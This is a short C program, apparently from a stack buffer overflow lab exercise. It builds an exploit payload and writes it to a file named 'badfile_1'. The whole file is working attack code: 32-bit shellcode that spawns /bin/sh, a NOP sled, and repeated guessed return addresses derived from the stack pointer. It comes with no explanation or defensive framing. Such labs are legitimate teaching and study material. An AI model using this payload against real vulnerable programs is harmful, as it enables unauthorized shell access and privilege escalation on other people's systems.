#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

unsigned long stack_ptr(){
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    memset(&buffer, 0x90, sizeof(buffer));

    char *ptr;
    int offset = 100, bsz = 517, i;
    long *addr_ptr = buffer, addr = stack_ptr() + offset;

    for (i = 0; i < 20; i++)
    	*(addr_ptr++) = addr;

    for (i = 0; i < strlen(shellcode); i++) 
     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[bsz - 1] = '\0';
    FILE *badfile = fopen("./badfile_1", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
